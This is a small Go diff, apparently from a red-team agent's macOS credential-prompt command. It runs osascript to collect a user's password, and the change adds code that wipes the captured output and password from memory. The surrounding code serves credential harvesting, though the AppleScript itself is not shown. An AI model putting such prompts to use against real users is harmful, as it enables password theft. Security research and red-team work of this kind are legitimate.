@@ -71,6 +71,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	defer cancel()
 
 	out, err := exec.CommandContext(ctx, "osascript", "-e", script).CombinedOutput()
+	defer structs.ZeroBytes(out)
 	if err != nil {
 		output := strings.TrimSpace(string(out))
 		if strings.Contains(output, "User canceled") ||
@@ -89,6 +90,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	password := strings.TrimSpace(string(out))
+	defer structs.ZeroString(&password)
 	if password == "" {
 		return structs.CommandResult{
 			Output:    "User submitted empty password",
